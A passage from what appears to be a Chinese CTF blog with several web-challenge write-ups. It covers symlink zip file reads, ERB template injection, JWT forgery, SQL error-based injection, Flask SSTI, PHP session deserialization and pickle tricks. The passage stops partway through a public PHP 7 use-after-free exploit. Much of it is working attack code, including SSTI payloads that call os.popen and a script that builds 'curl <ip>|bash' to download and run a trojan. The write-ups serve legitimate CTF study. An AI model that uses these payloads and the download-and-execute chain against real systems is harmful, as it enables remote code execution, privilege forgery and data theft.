n.hexdigest() f=request.files['file'] basepath=os.path.dirname(os.path.realpath(__file__)) path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\" path_base = basepath+'/upload/'+md5_ip+'/' filename = f.filename pathname = path+filename if \"zip\" != filename.split('.')[-1]: return 'zip only allowed' if not os.path.exists(path_base): try: os.makedirs(path_base) except Exception as e: return 'error' if not os.path.exists(path): try: os.makedirs(path) except Exception as e: return 'error' if not os.path.exists(pathname): try: f.save(pathname) except Exception as e: return 'error' try: cmd = \"unzip -n -d \"+path+\" \"+ pathname if cmd.find('|') != -1 or cmd.find(';') != -1: waf() return 'error' os.system(cmd) except Exception as e: return 'error' unzip_file = zipfile.ZipFile(pathname,'r') unzip_filename = unzip_file.namelist()[0] if session['is_login'] != True: return 'not login' try: if unzip_filename.find('/') != -1: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' image = open(path+unzip_filename, \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp except Exception as e: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' return render_template('upload.html')@app.route('/showflag')def showflag(): if True == False: image = open(os.path.join('./flag/flag.jpg'), \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp else: return \"can't give you\" 以正常逻辑来看，这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。这里我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。 结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的flag目录下。那么我们只要创建一个到/xxx/flask/flag/flag.jpg的软链接，即可读取 flag.jpg 文件。 两种方式构造： 1、在 linux 中，/proc/self/cwd/会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。 命令如下： ln -s /proc/self/cwd/flag/flag.jpg qwe zip -ry qwe.zip qwe 2、在 linux 中，/proc/self/environ文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到/proc/self/environ的内容，只需要下载到本地，用 notepad++打开即可) 命令如下： ln -s /proc/self/environ qqq zip -ry qqq.zip qqq ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www zip -ry [www.zip\\]\\(http://www.zip\\) www 解题在上一步中，我们已经成功拿到上传的权限了，现在到linux中生成读取flag的软连接，上传之后服务端回显如下： 因为是一个有问题的图片，无法显示，其实就是BUU改了，它本质上还是一个txt，下载下来即可拿到flag。 Flag Shop考察JWT伪造，ruby的ERB模板注入。后者是第一次接触 题目分析进入题目发现可以买flag，但是很贵，这个时候又可以进行work拿jkl，这点到啥时候去啊… 不过存在robots.txt，提示了filebake的存在： 访问fileback拿到源码： require 'sinatra'require 'sinatra/cookies'require 'sinatra/json'require 'jwt'require 'securerandom'require 'erb'set :public_folder, File.dirname(__FILE__) + '/static'FLAGPRICE = 1000000000000000000000000000ENV[\"SECRET\"] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\") file.sync = true use Rack::CommonLogger, fileendget \"/\" do redirect '/shop', 302endget \"/filebak\" do content_type :text erb IO.binread __FILE__endget \"/api/auth\" do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = authendget \"/api/info\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})endget \"/shop\" do erb :shopendget \"/work\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } auth = auth[0] unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end if params[:do] == \"#{params[:name][0,7]} is working\" then auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result endendpost \"/shop\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } if auth[0][\"jkl\"] &lt; FLAGPRICE then json({title: \"error\",message: \"no enough jkl\"}) else auth &lt;&lt; {flag: ENV[\"FLAG\"]} auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth json({title: \"success\",message: \"jkl is good thing\"}) endenddef islogin if cookies[:auth].nil? then redirect to('/shop') endend 代码是ruby写的，还没学…不过从代码中可以看到出现了JWT，应该跟JWT伪造有关，稍微审一下代码发现jkl指的应该就是金币数量，同uid一起写进了cookie里，抓个包拿jwt解密看看： 可以看到jkl的值为28，也就是现有的金币数，那应该就是要伪造JWT来买到flag了，但是伪造需要SECRET，现在我们并没有，怎么办？ 在/work路由下有这么一段代码： ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!') 这里我们可以控制，但是只有7个字符，参考题解说是ERB模板注入，这里可以用ruby的预定义字符$对匹配的字符串进行读取，从而获取SECRET，l利用点当然也就在/work路由下了，可以抓包看看： 根据参数构造payload如下： /work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working即/work?SECRET=&amp;name=&lt;%=$'%&gt;&amp;do=&lt;%=$'%&gt; is working 执行结果如下： 拿到SECRET之后，进行JWT伪造： 然后buy flag抓包进行替换即可买到flag： 由响应结果可以看到，已经成功买到了flag，但是响应中并没有啊，因为在代码中可以看到，flag其实被写入到了相应的JWT中，再去解密即可拿到。","link":"/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/"},{"title":"RootersCTF复现","text":"CTFtime上国外的比赛还是比较多的，而且大多也都比较有意思，开拓视野。 RootersCTF-BabywebMy junior dev just set up a password protected webpage. Can you get in? 分析过程打开链接提示管理员的密码是18位，并且过滤掉了UNION SLEEP ‘ “ OR - BENCHMARK。因此利用爆破出密码是比较不现实的，结合题目提示是使用注入方法。看到单引号和双引号被过滤，猜测是被反斜杠转义掉，便尝试宽字节注入，使用%df%27进行测试，结果注入失败。 并且提示UNION、OR也都被过滤，原本想着利用大小写或者编码绕过，但是引号既然不能成功绕过，说明不能用闭合引号进行注入。经过多次尝试发现利用extractvalue()函数进行报错注入可以成功实现注入,因此可以结合concat函数实现注入。 extractvalue()：函数功能是从目标XML中返回包含所查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) extractvalue注入的原理：如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。 注入过程1、爆库名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) 回显XPATH syntax error:~SQLinjection~，爆出了库名SQLinjection2、爆表名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) 回显XPATH syntax error:~users~，爆出了表名users这里需要说名一下，由于单双引号被过滤，故注入语句中如果有字符串需要单双引号，应当尽量避免，这里可以使用查询语句的多重利用避免，当然直接填库名也是不需要单双引号的（下面表名同理）。3、爆列名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) 回显XPATH syntax error:~user、uniqueid~，爆出列名user、uniqueid，这两个列里肯定有我们需要的重要内容。4、爆字段 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select uniqueid/user from users limit 1),0x7e)) 这里分两步分别爆出admin和其对应的18位的uniqueid，拿去尝试登录，成功登路并拿到flag。由于环境不能复现，做题的时候也没有截图，这里不再贴出图片。 报错注入参考链接：https://www.jianshu.com/p/bf5edd484957 I_&lt;3_Flask典型的SSTI，参考国外师傅的WP学到了一些新姿势 题目分析进入题目： 断定是python flask的SSTI了，但是不知道参数是啥，在复现的时候发现国外师傅提到一个参数扫描的工具arjun，直接扫参数： 用name参数测试一下： 可以看到成功注入，那下面就是利用注入姿势来爆flag了。 解题一种解题的payload是： name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}} name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()')}} 但是这种方法在复现的时候没有成功，学到另外一种姿势： name={{url_for.__globals__['__builtins__'].open('flag.txt').read()}} 参考：https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2 ImgXweb考察JWT伪造攻击。 题目分析进入题目发现存在注册、登录按钮，先注册一个登录看看，发现可以进行文件上传，但是奈何本题不是考文件上传拿shell的… 通过扫后台发现robots.txt的存在（可见扫后台的重要性啊）： 而robots.txt中提示了一个secretkey秘钥文件的存在，内容如下： 给这个干嘛？结果抓包发现了另一番天地： 可以看到cookie采用了JWT，拿去base64解密一下（还有几篇讲到JWT伪造攻击的博客，有需要的可以看看）： {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}{&quot;user&quot;:&quot;ggb0n&quot;}\u0006×¿ð¬Á#È¬\u0002­ \u0018\u0001í_mn×Z\u001cüt 这肯定是考JWT伪造的了，秘钥都给了，多简单，拿去网站伪造一下： 然后抓包改包，发现成功伪造了admin身份，从回显页面中可以看到flag.png的存在，这里赵师傅没有放原图，应该是为了方便BOT生成和识别固定格式的flag吧： 其实，flag已经很近了，查看源码可以看到flag.png的存储路径，直接访问即可拿到flag： 原来png不是png，而是txt啊…赵师傅badbad。。。 notifyxapi还是考察JWT伪造攻击。 题目分析进入题目，看到给出了几个利用curl进行注册、登录、查看通知的几个操作： 有点像教怎么用curl的[手动滑稽]，我们根据提供的语句去试试效果： 先注册个账户： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"created_user\":{\"id\":3,\"user\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc\"}} 关注的点来了：is_admin属性为false，多半知道这题是干嘛的了。先不管，先登录看看： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo\"} 可以看到登录和注册的时候JWT的第三部分是不同的，也就是表示登录的状态，看通知的话，当然要先登录嘛。 拿登录上的JWT去看看notification什么情况： curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" [{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"}] 通过这个请求，我们可以看到别的用户发的通知，想必管理员能看到不一样的结果吧，结合前面存在的is_admin属性并且为false，思路肯定是要去想办法让is_admin为true了。 解题由于回显的都是注册时候的键值对，我们直接在注册的时候多加一个&quot;id_admin&quot;:true的属性键值对创建个账户试试： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": 1\"password\",\"is_admin\":true}' {\"created_user\":{\"id\":4,\"user\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw\"}} 可见账户成功创建了，并且此时is_admin属性已经为true了，快登陆去看看通知： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"} 用登录上的JWT去看通知： export ACCESS=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" 回显如下： [{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"rooters{a_big_hard_business_in_a_big_hard_building}ctf\",\"id\":1,\"title\":\"flag\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"flag{1b411b83-d725-4e8f-a50a-3bd14a35de6a}\",\"id\":1,\"title\":\"flag\"}] 成功拿到flag。这题算是考察JWT伪造比较简单的了吧。","link":"/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/"},{"title":"高校战\"疫\"部分题解","text":"20多所高校联合出题抗“疫”的比赛，排面也是可以的，来感受一下优秀高校的熏陶。🧐 DAY 1看队友师傅们分享的文章，磕磕碰碰总算也做出了几题 sqlcheckin考察sql注入 解题进入题目，可以直接看源码： &lt;?php // ... $pdo = new PDO('mysql:host=localhost;dbname=sqlsql;charset=utf8;', 'xxx', 'xxx'); $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); $stmt = $pdo-&gt;prepare(\"SELECT username from users where username='${_POST['username']}' and password='${_POST['password']}'\"); $stmt-&gt;execute(); $result = $stmt-&gt;fetchAll(); if (count($result) &gt; 0) { if ($result[0]['username'] == 'admin') { include('flag.php'); exit(); // .... 发现又是用的PDO，前段时间刷题，还有赛题都出现了，这怕是一种趋势。 不过这题不难，尝试了一下，一般的万能密码是不好用了，因为or被ban了，但是通过读代码很容易能发现password处存在注入，or不能用了，但是利用减号可以构造一个password=false的语句，这样就不在判断password了，最后利用 admin/1'-'1登录即可拿到flag。 hackme考察PHP session的反序列化漏洞，主要利用了session.serialize_handler序列化和反序列化采用PHP而导致的漏洞。 题目分析进入题目，首先登录上发现可以更改sign，应该与管理员权限有关。但是抓包也看不出可利用的点。 然后就扫了后台，真的存在源码！在/www.zip路径下，下载之后又是一番代码审计，在profile.php发现了问题： &lt;?phperror_reporting(0);session_save_path('session');include 'lib.php';ini_set('session.serialize_handler', 'php');session_start();class info{ public $admin; public $sign; public function __construct() { $this-&gt;admin = $_SESSION['admin']; $this-&gt;sign = $_SESSION['sign']; } public function __destruct() { echo $this-&gt;sign; if ($this-&gt;admin === 1) { redirect('./core/index.php'); } }}$a = new info();?&gt; 可以看到，这里session.serialize_handler用的是PHP，而init.php中处理器的设置是php_serialize这样就可以参考前面提到的PHP session的漏洞了。再往下审计发现这里定义了info类，其中有admin和sign属性，并且__destruct()中指明如果admin===1就会定向到/core/index.php，这是个什么文件？去看一下： &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #变成管理员吧，奥利给} else { die('只有管理员才能看到我哟');} 此处无银三百两了，解题的关键肯定在这，但是这个地方会对$_SESSION进行检查，它又包含什么呢？在upload_sign.php下发现了内容： &lt;?phprequire_once('init.php');class upload_sign{ public $sign; public $admin = 0; public function __construct() { if (isset($_POST['sign'])) { $this-&gt;sign = $_POST['sign']; } else { $this-&gt;sign = \"这里空空如也哦\"; } } public function upload() { if ($this-&gt;checksign($this-&gt;sign)) { $_SESSION['sign'] = $this-&gt;sign; $_SESSION['admin'] = $this-&gt;admin; } else { echo \"???\"; } } public function checksign($sign) { return true; }}$a = new upload_sign();$a-&gt;upload(); 可以看到，在这里会对$_SESSION中的admin和sign属性赋值，从这里我们也就可以对session中的admin进行控制了，参考这里，即在设置sign的页面POST一个键值对，并且变量名与session.upload_progress.name相同，即可在session中写入新的内容。 根据这个思路，我们构造payload： ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";} 在修改sign的页面抓包，写入payload： 结果成功设置签名： 现在就是admin权限了，到/core/下发现如下代码： ./sandbox/ed04d2f141bd8a57cc5732b0ccf32456 &lt;?phprequire_once('./init.php');error_reporting(0);if (check_session($_SESSION)) { #hint : core/clear.php $sandbox = './sandbox/' . md5(\"Mrk@1xI^\" . $_SERVER['REMOTE_ADDR']); echo $sandbox; @mkdir($sandbox); @chdir($sandbox); if (isset($_POST['url'])) { $url = $_POST['url']; if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match('/(data:\\/\\/)|(&amp;)|(\\|)|(\\.\\/)/i', $url)) { echo \"you are hacker\"; } else { $res = parse_url($url); if (preg_match('/127\\.0\\.0\\.1$/', $res['host'])) { $code = file_get_contents($url); if (strlen($code) &lt;= 4) { @exec($code); } else { echo \"try again\"; } } } } else { echo \"invalid url\"; } } else { highlight_file(__FILE__); }} else { die('只有管理员才能看到我哟');} 可以发现，我们需要利用url进行命令执行，并且data://被ban了，这里想到了ByteCTF一道题的绕过姿势，先放这，url中需要有127.0.0.1才能进一步执行命令，可以参考如何绕过URL限制这篇文章，这里用@来绕过，然后利用compress.zlib://来满足file_get_contents函数的读取，成功过一卡。 'url':'compress.zlib://data:@127.0.0.1/plain;base64,' 正入万山圈子里啊…还要要求执行的命令长度不能超过4…想到了HITCON的一道题，绕过四字符限制getshell，也就是通过把命令拆解成四字符一组来执行命令。 利用命令的执行到VPS上下载木马，然后我们就能拿到shell了！ 理一下解题思路 1、利用PHP session的反序列化漏洞成为admin，读取/core/index.php关键代码 2、利用URL绕过姿势绕过对url的限制 3、利用compress.zlib:进行file_get_contents对文件的读取 4、绕过四字符限制getshell 解题关于解题的第四步还是要好好说一下的，为了下载木马，我把自己的博客都删了… 因为是用curl命令来到VPS上读取木马的代码，因此在VPS上配置好木马文件很重要，做题的时候这里就卡了很久，这一步也需要在本地好好测试，保证木马文件能成功访问。 在VPS上配置好木马文件之后，就可以通过url传参通过四字符执行命令来下载木马，然后浏览器拿shell了。 完整的解题脚本如下： #encoding=utf-8import requestsfrom time import sleepfrom urllib import quoteimport base64s = requests.session()url = \"http://121.36.222.22:88/login.php\"s.post(url, data={'name':'ggb0n'})url1 = \"http://121.36.222.22:88/?page=upload\"s.post(url1, data={'sign':'ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";}'})url3 = \"http://121.36.222.22:88/core/index.php\"s.get(url3)ip = 'xx.xx.xx.xx'ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')])payload = [ # 将 \"g&gt; ht- sl\" 写到文件 \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # 将文件\"v\"中的字符串倒序，放到文件\"x\"，就变成了 \"ls -th &gt;g\" '&gt;rev', '*v&gt;x', # generate `curl orange.tw.tw|python` # generate `curl 10.188.2.20|bash` '&gt;p\\ ', '&gt;ph\\\\', '&gt;a.\\\\', '&gt;\\&gt;\\\\', '&gt;%s\\\\' % ip[8:10], '&gt;%s\\\\' % ip[6:8], '&gt;%s\\\\' % ip[4:6], '&gt;%s\\\\' % ip[2:4], '&gt;%s\\\\' % ip[0:2], '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # getshell 'sh x', 'sh g', ]payload_all = 'compress.zlib://data:@127.0.0.1/plain;base64,{0}'r = requests.get(url3)for i in payload: r = requests.post(url3,data={\"url\":payload_all.format(base64.b64encode(i))}) print r.text print(data['url']) sleep(0.5) 下载木马之后，浏览器拿shell： 整理一下参考的文章：https://www.cnblogs.com/hf99/p/9746038.htmlhttps://xz.aliyun.com/t/6640#toc-10https://www.anquanke.com/post/id/87203 webtmp考察pickle的反序列化利用 题目分析进入题目 可以读源码： import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read()@app.route('/', methods=['GET', 'POST'])def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('一给我哩giaogiao', 'Giao') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) 基于flask的环境，并且采用了pickle 结合题目描述： Sample animal: Animal(name=’一给我哩giaogiao’, category=’Giao’) Pickled data: gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu I will give you the flag if we share the same animal as our favourite. 可知，我们需要构造一个与题目secret中一样的Animal类才能拿到flag，命令执行是不能的，因为R被ban了，我们又不可能知道secret中Animal的属性值。 但是从这篇文章得到了提示：存在b这个指令（call __setstate__ or__dict__.update()），可以更新字典，这样的话我们就可以先覆盖secret中原有的值，然后写入我们构造的键值对到字典中，这样我们就可以再构造Animal类满足题目要求，成功拿到flag了。 参考上面那篇文章的指令集，构造了如下的序列化指令： c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb. 注意这里的\\n换行符，也是一个巨坑…刚开始在Windows下构造的payload的base64之后提交反馈Somethin wrong，后来经师傅提示说pickle对换行符的\\r不能识别…涨知识… 两种方法： 1、字符串对象.replaceAll(&quot;\\r&quot;, &quot;&quot;); 2、到Linux中去加密 选择了去Linux中加密： #注意在Linux下&gt;&gt;&gt; import base64&gt;&gt;&gt; s = \"c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb.\"&gt;&gt;&gt; a = base64.b64encode(s)&gt;&gt;&gt; a'Y19fbWFpbl9fCnNlY3JldApwMAooZHAxClMnY2F0ZWdvcnknCnAyClMnZ2diMG4nCnAzCnNTJ25hbWUnCnA0ClMnZ2diMG4nCnA1CnNiLg==' 然后在本地生成个Animal对象： import pickleimport base64class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return \"Animal\" def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryif __name__ == '__main__': a = Animal('ggb0n','ggb0n') print(base64.b64encode(pickle.dumps(a))) 现将第一个payload的base64通过输入框提交反序列化执行覆盖字典，然后再提交我们构造的Animal对象的base64，即可拿到flag： 参考文章：https://www.anquanke.com/post/id/188981#h3-8http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/ PHP-UAF考察functions_disable的绕过，上次I春秋公益赛easy_thinking刚遇到的知识点，前两天在CTFHub上也在刷这方面的题。 题目分析进入题目直接给了小马： &lt;?php$sandbox = '/var/www/html/sandbox/' . md5(\"wdwd\" . $_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if (isset($_REQUEST['cmd'])) { @eval($_REQUEST['cmd']);}highlight_file(__FILE__); 先看一下phpinfo： 是PHP 7版本的，有一个bypass代码可以用，在这里。 然后看一下functions_disable果然ban掉了很多函数： 那么思路就有了： 1、蚁剑连接，上传bypass脚本 2、浏览器访问，获取shell 解题将如下的bypass脚本上传（上次的bypass脚本用不了…）： &lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(\"uname -a\");function pwn($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j &gt;= 0; $j--) { $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i &lt; $m; $i++) { $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; } return $out; } function write(&amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i &lt; $n; $i++) { $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec 